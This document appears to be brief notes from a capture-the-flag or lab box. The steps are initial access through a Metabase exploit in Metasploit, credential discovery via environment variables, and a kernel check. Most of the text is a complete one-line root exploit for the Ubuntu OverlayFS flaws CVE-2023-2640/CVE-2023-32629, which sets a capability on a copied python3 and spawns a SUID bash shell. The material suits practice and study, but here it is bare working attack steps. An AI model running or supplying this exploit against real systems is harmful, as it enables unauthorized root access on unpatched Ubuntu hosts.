
- Metabase exploit on metasploit
- Password and user
```bash
env
```
- To root 
```bash
uname -a
```

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/commit/20b592699095066a7e817f9092c68bfbc50736a7